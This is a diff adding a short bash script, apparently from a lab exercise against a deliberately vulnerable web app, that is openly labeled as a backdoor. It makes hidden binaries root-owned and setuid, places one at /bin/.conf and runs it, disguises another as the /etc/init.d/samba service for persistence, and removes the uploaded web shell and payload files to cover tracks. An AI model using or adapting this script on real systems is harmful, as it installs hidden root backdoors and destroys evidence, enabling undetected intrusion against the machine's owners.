@@ -1,0 +1,20 @@
+#!/bin/bash
+
+#BACKDOOR
+chown root:root /tmp/.conf
+chmod +x /tmp/.conf
+chmod u+s /tmp/.conf
+mv /tmp/.conf /bin/.conf
+/bin/.conf &
+
+#PERSIST
+chown root:root /tmp/samba
+chmod +x /tmp/samba
+chmod u+s /tmp/samba
+mv /tmp/samba /etc/init.d/samba
+
+#CLEAN HOUSE
+rm /var/www/dvwa/hackable/uploads/upload.php.jpeg
+rm /tmp/run
+rm /tmp/payload
+rm /tmp/8572
